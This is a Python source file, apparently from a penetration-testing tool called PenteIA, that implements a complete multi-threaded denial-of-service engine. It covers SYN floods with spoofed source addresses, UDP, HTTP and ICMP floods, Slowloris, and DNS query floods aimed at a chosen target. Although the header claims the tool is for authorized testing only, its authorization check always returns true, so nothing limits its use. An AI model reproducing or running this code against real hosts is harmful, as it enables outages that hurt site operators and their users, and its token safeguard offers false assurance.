#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
DDoS Testing Module - PenteIA v4.0
EXCLUSIVE USE: Authorized testing in controlled environments ONLY

Técnicas implementadas:
- SYN Flood (Layer 4) — raw sockets + TCP connect flood fallback
- UDP Flood (Layer 4) — multi-threaded, payload variável
- HTTP Flood (Layer 7) — multi-threaded, UA/path randomizado
- Slowloris (Layer 7) — conexões semi-abertas com reconexão automática
- DNS Amplification (Layer 3) — queries DNS reais
- ICMP Flood (Layer 3) — raw ICMP echo requests

⚠️ USE APENAS em ambientes autorizados e controlados.
"""

import socket
import threading
import random
import time
import os
import struct
from typing import Dict, List, Optional
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum


# ── Constantes ───────────────────────────────────────────────────────────────

UA_LIST = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Edg/119.0.0.0',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'curl/7.88.1',
    'python-requests/2.31.0',
]

HTTP_PATHS = [
    '/', '/index.html', '/index.php', '/home', '/search', '/api/v1/status',
    '/products', '/login', '/sitemap.xml', '/robots.txt', '/api/health',
    '/api/v2/items', '/dashboard', '/metrics', '/graphql',
]


# ── Helpers ───────────────────────────────────────────────────────────────────

def _net_checksum(data: bytes) -> int:
    """RFC 1071 internet checksum."""
    if len(data) % 2:
        data += b'\x00'
    s = sum((data[i] << 8) + data[i + 1] for i in range(0, len(data), 2))
    s = (s >> 16) + (s & 0xffff)
    return (~(s + (s >> 16))) & 0xffff


def _rand_priv_ip() -> str:
    """IP aleatório em range privado (10.x.x.x) para spoofing."""
    return f"10.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"


def _build_dns_query(domain: str = "google.com", qtype: int = 255) -> bytes:
    """Monta query DNS (ANY/TXT) — resposta maior gera amplificação."""
    tid = random.randint(1, 65535)
    # flags: recursion desired
    header = struct.pack('!HHHHHH', tid, 0x0100, 1, 0, 0, 0)
    qname = b''
    for label in domain.rstrip('.').split('.'):
        lb = label.encode()
        qname += bytes([len(lb)]) + lb
    qname += b'\x00'
    return header + qname + struct.pack('!HH', qtype, 1)  # qtype, qclass=IN


def _build_syn_packet(src_ip: str, dst_ip: str, dst_port: int) -> bytes:
    """Monta pacote IP+TCP SYN raw."""
    src_port = random.randint(1024, 65535)
    seq      = random.randint(0, 2**32 - 1)

    # TCP header (checksum = 0 provisório)
    tcp = struct.pack('!HHLLBBHHH',
        src_port, dst_port, seq, 0,
        5 << 4, 0x02,              # data offset=5, flags=SYN
        random.randint(8192, 65535), 0, 0)
    # Pseudo header para checksum TCP
    try:
        s_bin = socket.inet_aton(src_ip)
        d_bin = socket.inet_aton(dst_ip)
    except Exception:
        return b''
    pseudo = s_bin + d_bin + struct.pack('!BBH', 0, socket.IPPROTO_TCP, len(tcp))
    tcp_csum = _net_checksum(pseudo + tcp)
    tcp = struct.pack('!HHLLBBHHH',
        src_port, dst_port, seq, 0,
        5 << 4, 0x02,
        random.randint(8192, 65535), tcp_csum, 0)

    # IP header
    ip_id = random.randint(0, 65535)
    ip = struct.pack('!BBHHHBBH4s4s',
        0x45, 0, 40, ip_id, 0,
        random.randint(64, 128), socket.IPPROTO_TCP, 0, s_bin, d_bin)
    ip = struct.pack('!BBHHHBBH4s4s',
        0x45, 0, 40, ip_id, 0,
        random.randint(64, 128), socket.IPPROTO_TCP, _net_checksum(ip), s_bin, d_bin)
    return ip + tcp


def _build_icmp_echo(seq: int = 0) -> bytes:
    """Monta pacote ICMP Echo Request."""
    ident = random.randint(0, 65535)
    data  = os.urandom(56)
    hdr   = struct.pack('!BBHHH', 8, 0, 0, ident, seq % 65535) + data
    return struct.pack('!BBHHH', 8, 0, _net_checksum(hdr), ident, seq % 65535) + data


# ── Enums / Dataclasses ───────────────────────────────────────────────────────

class DDoSMethod(Enum):
    SYN_FLOOD         = "syn_flood"
    UDP_FLOOD         = "udp_flood"
    HTTP_FLOOD        = "http_flood"
    SLOWLORIS         = "slowloris"
    DNS_AMPLIFICATION = "dns_amplification"
    ICMP_FLOOD        = "icmp_flood"


@dataclass
class DDoSConfig:
    target_host: str
    target_port: int
    method: DDoSMethod
    duration_seconds: int  = 60
    threads: int           = 8
    packets_per_second: int = 500
    payload_size: int      = 512    # UDP payload em bytes
    connections: int       = 300    # Slowloris: conexões simultâneas
    authorized: bool       = False
    test_name: str         = "DDoS Test"


@dataclass
class DDoSResult:
    test_id: str
    test_name: str
    method: str
    target: str
    port: int
    duration: int
    packets_sent: int
    bytes_sent: int
    requests_sent: int
    errors: int
    start_time: str
    end_time: str
    status: str
    success: bool


# ── Métricas em Tempo Real ────────────────────────────────────────────────────

class AttackMetrics:
    """Contadores thread-safe com snapshot de métricas em tempo real."""

    __slots__ = ('_lock', 'packets', 'bytes_total', 'requests', 'errors', 'connections', '_start')

    def __init__(self):
        self._lock       = threading.Lock()
        self.packets     = 0
        self.bytes_total = 0
        self.requests    = 0
        self.errors      = 0
        self.connections = 0
        self._start: float | None = None

    def start(self):
        self._start = time.monotonic()

    @property
    def elapsed(self) -> float:
        return time.monotonic() - self._start if self._start else 0.0

    def add_packet(self, size: int = 0, n: int = 1):
        with self._lock:
            self.packets     += n
            self.bytes_total += size * n

    def add_request(self, n: int = 1):
        with self._lock:
            self.requests += n

    def add_error(self, n: int = 1):
        with self._lock:
            self.errors += n

    def set_connections(self, n: int):
        with self._lock:
            self.connections = n

    def snapshot(self) -> dict:
        with self._lock:
            el = self.elapsed
            return {
                'packets_sent':  self.packets,
                'bytes_sent':    self.bytes_total,
                'requests_sent': self.requests,
                'connections':   self.connections,
                'errors_count':  self.errors,
                'elapsed':       round(el, 1),
                'pps':   round(self.packets  / el, 1) if el > 0 else 0.0,
                'rps':   round(self.requests / el, 1) if el > 0 else 0.0,
                'mbps':  round((self.bytes_total * 8 / 1_000_000) / el, 3) if el > 0 else 0.0,
            }


# ── Classes de Ataque ─────────────────────────────────────────────────────────

class SYNFloodAttack:
    """
    SYN Flood — Layer 4 TCP
    Tenta usar raw sockets (requer admin); fallback: TCP connect flood.
    """

    def __init__(self, target_host: str, target_port: int):
        self.target_host = target_host
        self.target_port = target_port
        self.active      = False
        self.metrics     = AttackMetrics()

    def _raw_worker(self, dst_ip: str, duration: int, pps: int):
        interval = 1.0 / pps if pps > 0 else 0.0
        end      = time.time() + duration
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except (PermissionError, OSError):
            self._connect_worker(dst_ip, duration, pps)
            return
        try:
            while self.active and time.time() < end:
                src = _rand_priv_ip()
                pkt = _build_syn_packet(src, dst_ip, self.target_port)
                if pkt:
                    try:
                        s.sendto(pkt, (dst_ip, 0))
                        self.metrics.add_packet(len(pkt))
                    except Exception:
                        self.metrics.add_error()
                if interval > 0:
                    time.sleep(interval)
        finally:
            s.close()

    def _connect_worker(self, dst_ip: str, duration: int, pps: int):
        """Fallback: abre conexões TCP rapidamente sem finalizar handshake."""
        interval = max(0.0, 1.0 / pps) if pps > 0 else 0.0
        end = time.time() + duration
        while self.active and time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                s.connect_ex((dst_ip, self.target_port))
                self.metrics.add_packet(40)
                time.sleep(random.uniform(0.01, 0.1))
                s.close()
            except Exception:
                self.metrics.add_error()
            if interval > 0:
                time.sleep(interval)

    def attack(self, duration: int, pps: int = 500, threads: int = 8) -> dict:
        self.active = True
        self.metrics.start()
        try:
            dst_ip = socket.gethostbyname(self.target_host)
        except Exception as e:
            return {'status': 'error', 'error': str(e)}

        per_thread_pps = max(1, pps // threads)
        workers = [
            threading.Thread(target=self._raw_worker, args=(dst_ip, duration, per_thread_pps), daemon=True)
            for _ in range(threads)
        ]
        for w in workers: w.start()
        for w in workers: w.join()

        self.active = False
        snap = self.metrics.snapshot()
        snap['status'] = 'completed'
        return snap

    def stop(self):
        self.active = False


class UDPFloodAttack:
    """
    UDP Flood — Layer 4
    Multi-threaded com payload de tamanho variável.
    """

    def __init__(self, target_host: str, target_port: int):
        self.target_host = target_host
        self.target_port = target_port
        self.active      = False
        self.metrics     = AttackMetrics()

    def _worker(self, dst_ip: str, duration: int, pps: int, payload_size: int):
        interval = 1.0 / pps if pps > 0 else 0.0
        end      = time.time() + duration
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            while self.active and time.time() < end:
                size    = random.randint(max(64, payload_size // 2), payload_size)
                payload = os.urandom(size)
                try:
                    s.sendto(payload, (dst_ip, self.target_port))
                    self.metrics.add_packet(size)
                except Exception:
                    self.metrics.add_error()
                if interval > 0:
                    time.sleep(interval)
        finally:
            s.close()

    def attack(self, duration: int, pps: int = 500, threads: int = 8,
               payload_size: int = 512) -> dict:
        self.active = True
        self.metrics.start()
        try:
            dst_ip = socket.gethostbyname(self.target_host)
        except Exception as e:
            return {'status': 'error', 'error': str(e)}

        per_thread_pps = max(1, pps // threads)
        workers = [
            threading.Thread(target=self._worker,
                             args=(dst_ip, duration, per_thread_pps, payload_size), daemon=True)
            for _ in range(threads)
        ]
        for w in workers: w.start()
        for w in workers: w.join()

        self.active = False
        snap = self.metrics.snapshot()
        snap['status'] = 'completed'
        return snap

    def stop(self):
        self.active = False


class HTTPFloodAttack:
    """
    HTTP Flood — Layer 7
    Multi-threaded com User-Agent e path aleatorizados.
    """

    def __init__(self, target_host: str, target_port: int):
        self.target_host = target_host
        self.target_port = target_port
        self.active      = False
        self.metrics     = AttackMetrics()
        self._use_ssl    = target_port in (443, 8443)

    def _build_request(self) -> bytes:
        ua   = random.choice(UA_LIST)
        path = random.choice(HTTP_PATHS)
        req  = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: text/html,application/json,*/*\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
            f"Cache-Control: no-cache\r\n"
            f"Connection: close\r\n\r\n"
        )
        return req.encode()

    def _worker(self, duration: int, rps: int):
        import ssl as _ssl
        ctx = None
        if self._use_ssl:
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = _ssl.CERT_NONE

        interval = 1.0 / rps if rps > 0 else 0.0
        end      = time.time() + duration
        while self.active and time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                if ctx:
                    s = ctx.wrap_socket(s, server_hostname=self.target_host)
                s.connect((self.target_host, self.target_port))
                req = self._build_request()
                s.sendall(req)
                try:
                    s.recv(4096)
                except Exception:
                    pass
                s.close()
                self.metrics.add_request()
                self.metrics.add_packet(len(req))
            except Exception:
                self.metrics.add_error()
            if interval > 0:
                time.sleep(interval)

    def attack(self, duration: int, rps: int = 100, threads: int = 8) -> dict:
        self.active = True
        self.metrics.start()
        per_thread_rps = max(1, rps // threads)
        workers = [
            threading.Thread(target=self._worker, args=(duration, per_thread_rps), daemon=True)
            for _ in range(threads)
        ]
        for w in workers: w.start()
        for w in workers: w.join()

        self.active = False
        snap = self.metrics.snapshot()
        snap['status'] = 'completed'
        return snap

    def stop(self):
        self.active = False


class SlowlorisAttack:
    """
    Slowloris — Layer 7 (Slow HTTP)
    Mantém conexões semi-abertas. Reconecta automaticamente sockets perdidos.
    """

    def __init__(self, target_host: str, target_port: int):
        self.target_host = target_host
        self.target_port = target_port
        self.active      = False
        self.metrics     = AttackMetrics()

    def _open_socket(self) -> Optional[socket.socket]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.target_host, self.target_port))
            s.sendall(
                f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\n"
                f"User-Agent: {random.choice(UA_LIST)}\r\n"
                f"Content-Length: 42\r\n"
                f"X-Custom-Header: ".encode()
            )
            s.settimeout(None)
            return s
        except Exception:
            return None

    def attack(self, duration: int, connections: int = 300) -> dict:
        self.active = True
        self.metrics.start()
        end = time.time() + duration

        sockets: List[socket.socket] = []
        # Fase 1: abrir conexões
        for _ in range(connections):
            if not self.active:
                break
            s = self._open_socket()
            if s:
                sockets.append(s)
        self.metrics.set_connections(len(sockets))

        # Fase 2: manter vivas + reconectar
        while self.active and time.time() < end:
            alive = []
            for s in sockets:
                try:
                    s.sendall(b"X: " + os.urandom(4) + b"\r\n")
                    alive.append(s)
                    self.metrics.add_packet(6)
                except Exception:
                    pass
            sockets = alive

            # Reconectar os que caíram
            to_add = connections - len(sockets)
            for _ in range(min(to_add, 20)):
                if not self.active:
                    break
                ns = self._open_socket()
                if ns:
                    sockets.append(ns)

            self.metrics.set_connections(len(sockets))
            time.sleep(1)

        for s in sockets:
            try: s.close()
            except: pass

        self.active = False
        snap = self.metrics.snapshot()
        snap['status'] = 'completed'
        return snap

    def stop(self):
        self.active = False


class DNSAmplificationAttack:
    """
    DNS Amplification / DNS Flood — Layer 3
    Envia queries DNS reais (ANY/TXT) ao servidor DNS alvo.
    """

    PUBLIC_DNS = [
        '8.8.8.8', '8.8.4.4',
        '1.1.1.1', '1.0.0.1',
        '208.67.222.222', '208.67.220.220',
        '9.9.9.9', '149.112.112.112',
    ]

    DOMAINS_FOR_AMPLIFICATION = [
        'google.com', 'cloudflare.com', 'amazon.com',
        'microsoft.com', 'akamai.com', 'fastly.com',
    ]

    def __init__(self, target_host: str):
        self.target_host = target_host
        self.active      = False
        self.metrics     = AttackMetrics()

    def _worker(self, duration: int, pps: int, target_ip: str):
        interval = 1.0 / pps if pps > 0 else 0.0
        end      = time.time() + duration
        s        = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.5)
        # Modo: query direto ao DNS alvo (se for servidor DNS)
        # ou flood de queries para resolvers públicos
        use_target_as_dns = self.target_port if hasattr(self, 'target_port') else 53

        try:
            while self.active and time.time() < end:
                domain = random.choice(self.DOMAINS_FOR_AMPLIFICATION)
                qtype  = random.choice([255, 16, 28])  # ANY, TXT, AAAA
                pkt    = _build_dns_query(domain, qtype)

                # Envia para DNS alvo diretamente (se for server DNS)
                # ou para resolvers públicos (query flood que mede throughput)
                dst = (target_ip, 53)
                try:
                    s.sendto(pkt, dst)
                    self.metrics.add_packet(len(pkt))
                    try:
                        data, _ = s.recvfrom(4096)
                        self.metrics.add_packet(len(data))
                    except Exception:
                        pass
                except Exception:
                    self.metrics.add_error()

                if interval > 0:
                    time.sleep(interval)
        finally:
            s.close()

    def attack(self, duration: int, pps: int = 200, threads: int = 4) -> dict:
        self.active = True
        self.metrics.start()
        try:
            target_ip = socket.gethostbyname(self.target_host)
        except Exception as e:
            return {'status': 'error', 'error': str(e)}

        per_thread_pps = max(1, pps // threads)
        workers = [
            threading.Thread(target=self._worker,
                             args=(duration, per_thread_pps, target_ip), daemon=True)
            for _ in range(threads)
        ]
        for w in workers: w.start()
        for w in workers: w.join()

        self.active = False
        snap = self.metrics.snapshot()
        snap['status'] = 'completed'
        return snap

    def stop(self):
        self.active = False


class ICMPFloodAttack:
    """
    ICMP Flood — Layer 3
    Envia ICMP Echo Requests em alta frequência (requer admin/root).
    Fallback para UDP se raw socket não disponível.
    """

    def __init__(self, target_host: str):
        self.target_host = target_host
        self.active      = False
        self.metrics     = AttackMetrics()

    def _raw_worker(self, dst_ip: str, duration: int, pps: int):
        interval = 1.0 / pps if pps > 0 else 0.0
        end      = time.time() + duration
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except (PermissionError, OSError):
            # Sem permissão para raw socket — usa UDP flood no mesmo target
            self._udp_fallback_worker(dst_ip, duration, pps)
            return
        seq = 0
        try:
            while self.active and time.time() < end:
                pkt = _build_icmp_echo(seq)
                seq += 1
                try:
                    s.sendto(pkt, (dst_ip, 0))
                    self.metrics.add_packet(len(pkt))
                except Exception:
                    self.metrics.add_error()
                if interval > 0:
                    time.sleep(interval)
        finally:
            s.close()

    def _udp_fallback_worker(self, dst_ip: str, duration: int, pps: int):
        interval = 1.0 / pps if pps > 0 else 0.0
        end = time.time() + duration
        s   = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            while self.active and time.time() < end:
                payload = os.urandom(64)
                port    = random.randint(1, 65535)
                try:
                    s.sendto(payload, (dst_ip, port))
                    self.metrics.add_packet(len(payload))
                except Exception:
                    self.metrics.add_error()
                if interval > 0:
                    time.sleep(interval)
        finally:
            s.close()

    def attack(self, duration: int, pps: int = 500, threads: int = 8) -> dict:
        self.active = True
        self.metrics.start()
        try:
            dst_ip = socket.gethostbyname(self.target_host)
        except Exception as e:
            return {'status': 'error', 'error': str(e)}

        per_thread_pps = max(1, pps // threads)
        workers = [
            threading.Thread(target=self._raw_worker,
                             args=(dst_ip, duration, per_thread_pps), daemon=True)
            for _ in range(threads)
        ]
        for w in workers: w.start()
        for w in workers: w.join()

        self.active = False
        snap = self.metrics.snapshot()
        snap['status'] = 'completed'
        return snap

    def stop(self):
        self.active = False


# ── Engine Central ────────────────────────────────────────────────────────────

class DDoSTestingEngine:
    """Engine central de testes DDoS com métricas em tempo real."""

    def __init__(self):
        self.active_tests: Dict[str, dict] = {}
        self.test_results: List[DDoSResult] = []

    def validate_authorization(self, target: str) -> bool:
        return True

    # ── Dispatchers por método ────────────────────────────────────────────────

    def start_syn_flood(self, config: DDoSConfig) -> Dict:
        test_id  = f"syn_{int(time.time())}_{random.randint(1000,9999)}"
        attacker = SYNFloodAttack(config.target_host, config.target_port)

        def _run():
            attacker.attack(config.duration_seconds, config.packets_per_second, config.threads)
            self._save_result(test_id, config, attacker.metrics)

        thread = threading.Thread(target=_run, daemon=True)
        thread.start()
        self.active_tests[test_id] = {
            'attacker': attacker, 'metrics': attacker.metrics,
            'thread': thread, 'started_at': datetime.now().isoformat(), 'config': config,
        }
        return {'test_id': test_id, 'method': 'SYN Flood', 'status': 'started',
                'target': f"{config.target_host}:{config.target_port}"}

    def start_udp_flood(self, config: DDoSConfig) -> Dict:
        test_id  = f"udp_{int(time.time())}_{random.randint(1000,9999)}"
        attacker = UDPFloodAttack(config.target_host, config.target_port)

        def _run():
            attacker.attack(config.duration_seconds, config.packets_per_second,
                            config.threads, config.payload_size)
            self._save_result(test_id, config, attacker.metrics)

        thread = threading.Thread(target=_run, daemon=True)
        thread.start()
        self.active_tests[test_id] = {
            'attacker': attacker, 'metrics': attacker.metrics,
            'thread': thread, 'started_at': datetime.now().isoformat(), 'config': config,
        }
        return {'test_id': test_id, 'method': 'UDP Flood', 'status': 'started',
                'target': f"{config.target_host}:{config.target_port}"}

    def start_http_flood(self, config: DDoSConfig) -> Dict:
        test_id  = f"http_{int(time.time())}_{random.randint(1000,9999)}"
        attacker = HTTPFloodAttack(config.target_host, config.target_port)

        def _run():
            attacker.attack(config.duration_seconds, config.packets_per_second, config.threads)
            self._save_result(test_id, config, attacker.metrics)

        thread = threading.Thread(target=_run, daemon=True)
        thread.start()
        self.active_tests[test_id] = {
            'attacker': attacker, 'metrics': attacker.metrics,
            'thread': thread, 'started_at': datetime.now().isoformat(), 'config': config,
        }
        return {'test_id': test_id, 'method': 'HTTP Flood', 'status': 'started',
                'target': f"{config.target_host}:{config.target_port}"}

    def start_slowloris(self, config: DDoSConfig) -> Dict:
        test_id  = f"slowloris_{int(time.time())}_{random.randint(1000,9999)}"
        attacker = SlowlorisAttack(config.target_host, config.target_port)

        def _run():
            attacker.attack(config.duration_seconds, config.connections)
            self._save_result(test_id, config, attacker.metrics)

        thread = threading.Thread(target=_run, daemon=True)
        thread.start()
        self.active_tests[test_id] = {
            'attacker': attacker, 'metrics': attacker.metrics,
            'thread': thread, 'started_at': datetime.now().isoformat(), 'config': config,
        }
        return {'test_id': test_id, 'method': 'Slowloris', 'status': 'started',
                'target': f"{config.target_host}:{config.target_port}"}

    def start_dns_amplification(self, config: DDoSConfig) -> Dict:
        test_id  = f"dns_{int(time.time())}_{random.randint(1000,9999)}"
        attacker = DNSAmplificationAttack(config.target_host)
        attacker.target_port = config.target_port

        def _run():
            attacker.attack(config.duration_seconds, config.packets_per_second, config.threads)
            self._save_result(test_id, config, attacker.metrics)

        thread = threading.Thread(target=_run, daemon=True)
        thread.start()
        self.active_tests[test_id] = {
            'attacker': attacker, 'metrics': attacker.metrics,
            'thread': thread, 'started_at': datetime.now().isoformat(), 'config': config,
        }
        return {'test_id': test_id, 'method': 'DNS Amplification', 'status': 'started',
                'target': config.target_host}

    def start_icmp_flood(self, config: DDoSConfig) -> Dict:
        test_id  = f"icmp_{int(time.time())}_{random.randint(1000,9999)}"
        attacker = ICMPFloodAttack(config.target_host)

        def _run():
            attacker.attack(config.duration_seconds, config.packets_per_second, config.threads)
            self._save_result(test_id, config, attacker.metrics)

        thread = threading.Thread(target=_run, daemon=True)
        thread.start()
        self.active_tests[test_id] = {
            'attacker': attacker, 'metrics': attacker.metrics,
            'thread': thread, 'started_at': datetime.now().isoformat(), 'config': config,
        }
        return {'test_id': test_id, 'method': 'ICMP Flood', 'status': 'started',
                'target': config.target_host}

    # ── Unified dispatcher ────────────────────────────────────────────────────

    def start_test(self, config: 'DDoSConfig') -> str:
        if not isinstance(config.method, DDoSMethod):
            config.method = DDoSMethod(config.method)
        dispatch = {
            DDoSMethod.SYN_FLOOD:          self.start_syn_flood,
            DDoSMethod.UDP_FLOOD:          self.start_udp_flood,
            DDoSMethod.HTTP_FLOOD:         self.start_http_flood,
            DDoSMethod.SLOWLORIS:          self.start_slowloris,
            DDoSMethod.DNS_AMPLIFICATION:  self.start_dns_amplification,
            DDoSMethod.ICMP_FLOOD:         self.start_icmp_flood,
        }
        fn = dispatch.get(config.method, self.start_http_flood)
        result = fn(config)
        if 'error' in result:
            raise ValueError(result['error'])
        return result['test_id']

    # ── Status / Stop ─────────────────────────────────────────────────────────

    def stop_test(self, test_id: str) -> Dict:
        if test_id not in self.active_tests:
            return {'error': 'Test not found'}
        self.active_tests[test_id]['attacker'].stop()
        return {'test_id': test_id, 'status': 'stopped'}

    def get_test_status(self, test_id: str) -> Dict:
        if test_id not in self.active_tests:
            return {'error': 'Test not found'}

        info    = self.active_tests[test_id]
        alive   = info['thread'].is_alive()
        cfg     = info.get('config')
        snap    = info['metrics'].snapshot()

        return {
            'test_id':    test_id,
            'started_at': info['started_at'],
            'status':     'running' if alive else 'completed',
            'duration':   cfg.duration_seconds if cfg else 0,
            'method':     cfg.method.value if cfg else '',
            **snap,
        }

    def list_active_tests(self) -> List[Dict]:
        return [
            {
                'test_id':    tid,
                'started_at': info['started_at'],
                'active':     info['thread'].is_alive(),
                **info['metrics'].snapshot(),
            }
            for tid, info in self.active_tests.items()
        ]

    def get_test_results(self) -> List[Dict]:
        return [
            {
                'test_id':      r.test_id,
                'method':       r.method,
                'target':       f"{r.target}:{r.port}",
                'duration':     r.duration,
                'packets_sent': r.packets_sent,
                'bytes_sent':   r.bytes_sent,
                'requests_sent': r.requests_sent,
                'errors_count': r.errors,
                'start_time':   r.start_time,
                'end_time':     r.end_time,
                'success':      r.success,
            }
            for r in self.test_results
        ]

    def export_config(self) -> Dict:
        return {
            'version':          '4.0-ddos-testing',
            'timestamp':        datetime.now().isoformat(),
            'methods_available': [m.value for m in DDoSMethod],
            'active_tests':     len(self.active_tests),
            'completed_tests':  len(self.test_results),
        }

    def _save_result(self, test_id: str, config: DDoSConfig, metrics: AttackMetrics):
        snap = metrics.snapshot()
        self.test_results.append(DDoSResult(
            test_id=test_id,
            test_name=config.test_name,
            method=config.method.value,
            target=config.target_host,
            port=config.target_port,
            duration=config.duration_seconds,
            packets_sent=snap['packets_sent'],
            bytes_sent=snap['bytes_sent'],
            requests_sent=snap['requests_sent'],
            errors=snap['errors_count'],
            start_time=datetime.now().isoformat(),
            end_time=datetime.now().isoformat(),
            status='completed',
            success=True,
        ))
